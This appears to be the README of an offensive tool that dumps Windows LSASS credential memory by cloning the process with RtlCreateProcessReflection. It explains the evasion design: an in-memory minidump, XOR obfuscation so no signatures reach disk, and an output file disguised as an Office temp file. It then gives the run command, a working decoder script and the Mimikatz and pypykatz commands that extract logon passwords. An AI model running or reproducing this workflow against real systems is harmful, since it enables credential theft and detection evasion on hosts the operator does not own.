# LsassReflectDumping

**Purpose:** Standalone LSASS credential dump utility (T1003.001) using process reflection.

## Overview

Instead of the classic `OpenProcess(lsass.exe) → MiniDumpWriteDump` pattern, this tool forks LSASS via the undocumented `RtlCreateProcessReflection` API, creating a suspended clone under a new PID, then dumps the clone rather than LSASS itself. The entire minidump is captured in-memory through a `MINIDUMP_CALLBACK_INFORMATION` callback before being XOR-encrypted in-place with a linear position-dependent key — no MDMP magic bytes or credential strings reach disk. Output flushes to `%TEMP%\~DFxxxx.tmp` (MS Office temp naming), and the path is printed to stdout for the operator to retrieve.

## Target context

- **Host / OS / arch:** Windows Server 2022+ / Windows 10+, x64
- **Privilege required:** SYSTEM or Administrator (elevated token)

## Usage

```powershell
# ☣️ Requires elevated session — dumps credential material
.\ReflectDump.exe
# stdout: C:\Users\<user>\AppData\Local\Temp\~DFA1B2.tmp
```

Decrypt offline with the bundled XOR decoder (same linear-position-XOR scheme as the sibling tools in this bundle, e.g. ../NtdsRawDump/):

```python
import sys
data = open(sys.argv[1], 'rb').read()
open('lsass.dmp', 'wb').write(
    bytes(b ^ ((0xA3 + i * 0x5B) & 0xFF) for i, b in enumerate(data))
)
```

Parse offline — no network required:

```bash
pypykatz lsa minidump lsass.dmp

# or via Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords full
```

## See also

- Build: `Build.md`  ·  Code flow & ATT&CK mapping: `Flow.md`
